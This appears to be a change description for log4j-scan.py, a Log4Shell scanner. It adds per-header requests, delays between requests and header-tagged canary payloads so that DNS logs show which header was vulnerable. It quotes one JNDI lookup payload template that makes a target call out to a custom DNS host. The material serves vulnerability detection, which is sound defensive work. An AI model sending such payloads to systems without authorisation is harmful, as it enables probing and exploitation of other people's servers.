Update log4j-scan.py
Added the following capabilities:

Noticed that the scanner submits all headers/parameters at once. This can cause issues with how the target server responds to the request (ie: server may not accept certain headers, but this is not easily identifiable). Added a functionality to send all headers individually (-i, --individual)

Added ability to sleep between requests (--sleep-time [Default: 1]). This will assist with reviewing DNS/CanaryToken logs to more easily identify which header is vulnerable based off the REQUEST time and RESPONSE time by custom DNS.

Added payload header canary. When submitting a request, the payload will contain the header and parameter value. For example: ${jndi:ldap//<targetHost>.User-Agent.<customDNS>}. Now, when reviewing logs, you can identify that the User-Agent header was where the vulnerability was.

Terminal will display the type of request (GET/POST), the Header that was submitted and the UTC time in which it was sent. This will also help with identifying CanaryToken, Interact.sh and Burp Collaborator responses